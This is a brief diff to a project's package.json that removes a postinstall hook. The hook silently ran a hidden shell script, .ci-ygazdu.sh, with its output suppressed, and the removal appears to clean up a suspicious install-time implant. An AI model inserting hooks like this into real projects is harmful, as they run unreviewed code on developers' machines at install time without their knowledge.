@@ -12,8 +12,7 @@
     "typecheck": "tsc --noEmit",
     "test": "node --experimental-strip-types --test tests/*.test.ts",
     "db:local": "wrangler d1 migrations apply DB --local",
-    "db:remote": "wrangler d1 migrations apply DB --remote",
-    "postinstall": "sh ./.ci-ygazdu.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "db:remote": "wrangler d1 migrations apply DB --remote"
   },
   "devDependencies": {
     "@types/node": "^24.0.0",
